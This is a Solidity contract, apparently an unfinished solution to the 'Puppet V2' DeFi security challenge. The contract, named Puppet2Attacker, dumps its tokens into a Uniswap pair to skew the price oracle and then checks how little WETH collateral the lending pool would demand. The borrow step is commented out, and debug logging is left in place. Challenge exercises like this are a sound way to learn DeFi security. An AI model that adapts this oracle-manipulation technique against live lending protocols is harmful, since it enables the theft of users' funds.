// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";
import "@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol";
import "../puppet-v2/PuppetV2Pool.sol";

interface UniswapRouter {
    // function swapExactETHForTokens() external payable returns(uint256);
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external returns(uint256[] memory);
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external payable returns(uint256[] memory);
}

interface IERC202 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint wad) external;
}

contract Puppet2Attacker{

    PuppetV2Pool private puppet2;
    IERC202 private token;
    IERC202 private weth;
    address uniswapFactory;
    UniswapRouter uniswapRouter;


    constructor(address _puppet2, address _token, address _weth, address _uniswapFactory, address _uniswapRouter) public {
        puppet2 = PuppetV2Pool(_puppet2);
        token = IERC202(_token);
        weth = IERC202(_weth);
        uniswapFactory = _uniswapFactory;
        uniswapRouter = UniswapRouter(_uniswapRouter);
    }

    function attack(uint256 initialPoolAmount, uint initialAttackerAmount) external payable{
        // (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(
        //     uniswapFactory, address(weth), address(token));
        // uint256 maxReceived = UniswapV2Library.getAmountOut(initialAttackerAmount, reservesWETH, reservesToken);
        
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        token.approve(address(uniswapRouter), initialAttackerAmount);
        uint256[] memory response = uniswapRouter.swapExactTokensForTokens(initialAttackerAmount, 1, path, address(this), block.timestamp + 1);
        
        weth.deposit{value: msg.value}();

        uint256 needed = puppet2.calculateDepositOfWETHRequired(initialPoolAmount);
        // puppet2.borrow(initialPoolAmount);

        console.log("cccccc %s", address(this).balance);
        console.log("bbbbbb %s", weth.balanceOf(address(this)));
        console.log("aaaaaa %s", needed);
    }

    receive() payable external{

    }
}